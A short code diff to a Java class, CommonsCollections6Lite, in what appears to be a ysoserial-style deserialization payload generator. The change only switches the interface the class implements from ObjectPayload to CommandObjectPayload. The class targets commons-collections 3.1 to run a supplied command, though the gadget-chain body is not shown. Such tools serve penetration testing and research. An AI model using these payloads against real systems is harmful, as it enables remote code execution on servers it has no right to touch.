@@ -7,7 +7,7 @@ import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
-import com.h2tg.ysogate.payloads.ObjectPayload;
+import com.h2tg.ysogate.payloads.CommandObjectPayload;
 import com.h2tg.ysogate.annotation.Authors;
 import com.h2tg.ysogate.annotation.Dependencies;
 import com.h2tg.ysogate.utils.Reflections;
@@ -18,7 +18,8 @@ import java.util.Map;
 
 @Dependencies({"commons-collections:commons-collections:3.1"})
 @Authors({Authors.MATTHIASKAISER})
-public class CommonsCollections6Lite implements ObjectPayload<Object> {
+public class CommonsCollections6Lite implements CommandObjectPayload<Object>
+{
 
 	@Override
 	public Object getObject(String command) throws Exception {
